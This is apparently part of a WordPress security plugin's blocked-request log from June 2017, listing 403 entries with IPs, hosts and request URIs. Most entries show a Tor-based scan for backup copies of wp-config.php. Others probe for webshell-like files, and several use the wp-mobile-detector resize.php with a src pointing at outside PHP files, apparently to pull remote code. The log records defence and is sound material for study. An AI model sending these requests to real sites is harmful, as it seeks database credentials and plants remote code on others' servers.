+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpold
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpb
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpc
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php-n
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpnew
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~~~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phptmp
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.bak
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpbak
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php_old
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php_
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.in
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:22 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.sample
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:23 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpn
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:23 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~~~~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:23 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.backup.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:23 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.backup
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpo
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpd
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpe
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.com
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.us
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:24 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.uk
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:25 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php-o
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 9, 2017 - 3:34 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 163.172.108.151
+Host Name: 163-172-108-151.rev.poneytelecom.eu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.whatsmycut.com/wp-includes/logo_img.php
+REQUEST_URI: /wp-includes/logo_img.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
+
+[403 GET Request: June 9, 2017 - 4:32 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 91.200.12.60
+Host Name: seo665.heilink.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.google.com/
+REQUEST_URI: /wp-includes/class-wp-upgrade.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2896.3 Safari/537.36
+
+[403 GET Request: June 9, 2017 - 4:52 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.100
+Host Name: 46.229.164.100
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 9, 2017 - 5:38 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: June 11, 2017 - 9:23 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.65
+Host Name: 46.229.168.65
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 11, 2017 - 9:23 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 12, 2017 - 10:42 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/theme-compat/umos.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 GET Request: June 13, 2017 - 4:18 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 5.44.168.47
+Host Name: nat-12-8.nsk.sibset.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/install.php?step=1
+QUERY_STRING: 
+HTTP_USER_AGENT: www.petitsage.fr site detector 0.4
+
+[403 GET Request: June 13, 2017 - 5:19 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 173.208.169.250
+Host Name: 173.208.169.250
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 14, 2017 - 2:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 91.200.12.114
+Host Name: seo.9heilink.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 14, 2017 - 11:07 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 91.200.12.114
+Host Name: seo.9heilink.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: June 15, 2017 - 2:50 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.18
+Host Name: 180.97.215.18
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 15, 2017 - 2:50 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.18
+Host Name: 180.97.215.18
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 15, 2017 - 2:50 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.18
+Host Name: 180.97.215.18
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: June 15, 2017 - 2:50 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.97.215.18
+Host Name: 180.97.215.18
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
